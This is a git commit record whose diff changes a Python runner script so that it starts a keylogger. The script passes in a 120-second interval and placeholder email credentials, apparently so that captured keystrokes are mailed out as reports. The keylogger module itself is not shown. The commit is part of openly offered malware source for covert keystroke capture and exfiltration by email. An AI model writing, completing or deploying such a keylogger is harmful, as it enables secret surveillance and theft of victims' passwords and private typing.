3f625866e68bb8fa62848dce43478b3a192128a0
shawn2506 <dsouzashawn62@yahoo.in>
2019-12-18 18:59:38 +0530

    Runner to trigger the keylogger

--- keylogger/keylogger-runner.py
+++ keylogger/keylogger-runner.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
 import keylogger
 
-my_keylogger = keylogger.Keylogger()
+my_keylogger = keylogger.Keylogger(120, "emailid-to-receive-report", "passwd-for-the-email")
 my_keylogger.start()
